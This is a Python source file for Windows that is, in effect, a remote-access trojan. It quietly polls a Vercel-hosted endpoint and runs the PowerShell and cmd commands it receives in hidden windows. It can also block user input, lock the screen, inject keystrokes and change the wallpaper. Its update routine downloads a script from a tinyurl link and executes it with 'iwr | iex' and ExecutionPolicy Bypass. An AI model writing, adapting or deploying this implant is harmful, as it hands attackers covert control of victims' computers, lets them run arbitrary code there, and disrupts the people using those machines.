import socket
import threading
import subprocess
import os
import sys
import json
import time
import ctypes




si = subprocess.STARTUPINFO()
si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
si.wShowWindow = 0  
url = "https://nextjs-boilerplate-azure-eight-88.vercel.app/api/"

pythonw = sys.executable.replace("python.exe", "pythonw.exe")
if not os.path.exists(pythonw):
    pythonw = "pythonw"  

# BEGIN AUXILIARY FUNCTIONS

SPI_SETDESKWALLPAPER = 20
SPIF_UPDATEINIFILE = 0x01
SPIF_SENDWININICHANGE = 0x02

def set_wallpaper(path):
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        path,
        SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
    )



SendInput = ctypes.windll.user32.SendInput

SendInput = ctypes.windll.user32.SendInput

endInput = ctypes.windll.user32.SendInput

# C struct redefinitions 
PUL = ctypes.POINTER(ctypes.c_ulong)
class KeyBdInput(ctypes.Structure):
    _fields_ = [("wVk", ctypes.c_ushort),
                ("wScan", ctypes.c_ushort),
                ("dwFlags", ctypes.c_ulong),
                ("time", ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class HardwareInput(ctypes.Structure):
    _fields_ = [("uMsg", ctypes.c_ulong),
                ("wParamL", ctypes.c_short),
                ("wParamH", ctypes.c_ushort)]

class MouseInput(ctypes.Structure):
    _fields_ = [("dx", ctypes.c_long),
                ("dy", ctypes.c_long),
                ("mouseData", ctypes.c_ulong),
                ("dwFlags", ctypes.c_ulong),
                ("time",ctypes.c_ulong),
                ("dwExtraInfo", PUL)]

class Input_I(ctypes.Union):
    _fields_ = [("ki", KeyBdInput),
                 ("mi", MouseInput),
                 ("hi", HardwareInput)]

class Input(ctypes.Structure):
    _fields_ = [("type", ctypes.c_ulong),
                ("ii", Input_I)]



def PressKey(hexKeyCode):
    if isinstance(hexKeyCode, str):
        hexKeyCode = ord(hexKeyCode.upper())
    extra = ctypes.c_ulong(0)
    ii_ = Input_I()
    ii_.ki = KeyBdInput( hexKeyCode, 0x48, 0, 0, ctypes.pointer(extra) )
    ##scancode
    #ii_.ki = KeyBdInput( 0, hexKeyCode, 0x0008, 0, ctypes.pointer(extra) )
    x = Input( ctypes.c_ulong(1), ii_ )
    ctypes.windll.user32.SendInput(1, ctypes.pointer(x), ctypes.sizeof(x))




def play_wav(path):
    ctypes.windll.winmm.PlaySoundW(path, 0, 1) 

def move_window(x, y, width, height):
    user32 = ctypes.windll.user32
    hwnd = user32.GetForegroundWindow()
    user32.MoveWindow(hwnd, x, y, width, height, True)

def mouse_move(x, y):
    ctypes.windll.user32.SetCursorPos(x,y)

def minimize_window():
    SW_MINIMIZE = 6
    hwnd = ctypes.windll.user32.GetForegroundWindow()
    ctypes.windll.user32.ShowWindow(hwnd, SW_MINIMIZE)

def lock_workstation():
    ctypes.windll.user32.LockWorkStation()

def block_input(seconds):
    if seconds == "start":
        ctypes.windll.user32.BlockInput(True)
    elif seconds == "stop":
        ctypes.windll.user32.BlockInput(False)
    else:
        ctypes.windll.user32.BlockInput(True)
        time.sleep(int(seconds))
        ctypes.windll.user32.BlockInput(False)

def SetForeground(title):
    hwnd = ctypes.windll.user32.FindWindowW(None, title)
    if hwnd:
        SW_SHOW = 5
        ctypes.windll.user32.ShowWindow(hwnd, SW_SHOW)
        ctypes.windll.user32.SetForegroundWindow(hwnd)
    

# BEGIN CORE LOGIC



def fetch_message():
    try:
        response = requests.get(url)
        if response.status_code == 200:
            return response.text
        else:
            return f"Error: Received status code {response.status_code}"
    except Exception as e:
        return f"Exception occurred: {e}"



def run_command(*args):
    try:
        subprocess.Popen(
            args,
            startupinfo=si,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    except Exception as e:
        print(f"Exception occurred while running command: {e}")




subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
import requests


def update():
    run_command("powershell.exe", "-Command", "start powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command 'iwr https://tinyurl.com/37c7jjb7 -UseBasicParsing | iex'")
    time.sleep(1)
    exit()

def main():
    old_content = ""
    sleepTime = 30
    #print("Starting command fetch loop...")
    while True:
        try:
            time.sleep(sleepTime)
            #print("\nloop\n")
            keypair = json.loads(fetch_message())
            raw = keypair["text"]
            if raw == old_content:
                continue
            else:
                old_content = raw
            command = str.split(raw, '~')
        # print(f'command:', command, ' command[0]:', command[0], ' command[1]:', command[1] if len(command) > 1 else 'N/A')
            if command[0] == "execs":
                #print("Executing PowerShell command...")
                run_command("powershell.exe", "-Command", command[1])
            elif command[0] == "execc":
                #print("Executing CMD command...")
                run_command("cmd.exe", "/c " + command[1])
            elif command[0] == "die":
                break
            elif command[0] == "arm":
                sleepTime = 10
            elif command[0] == "wallpaper":
                set_wallpaper(command[1])
            elif command[0] == "string":
                for char in command[1]:
                    PressKey(char)
                    time.sleep(0.1)
            elif command[0] == "key":
                PressKey(command[1])
            elif command[0] == "wav":
                play_wav(command[1])
            elif command[0] == "move":
                params = command[1].split(',')
                move_window(int(params[0]), int(params[1]), int(params[2]), int(params[3]))
            elif command[0] == "mouse":
                params = command[1].split(',')
                mouse_move(int(params[0]), int(params[1]))
            elif  command[0] == "minimize":
                minimize_window()
            elif command[0] == "lock":
                lock_workstation()
            elif command[0] == "block":
                block_input(command[1])
            elif command[0] == "foreground":
                SetForeground(command[1])
            elif command[0] == "update":
                update()
            else:
                sleepTime = 30
        except Exception as e:
            pass
        
if __name__ == "__main__":
    main()
    
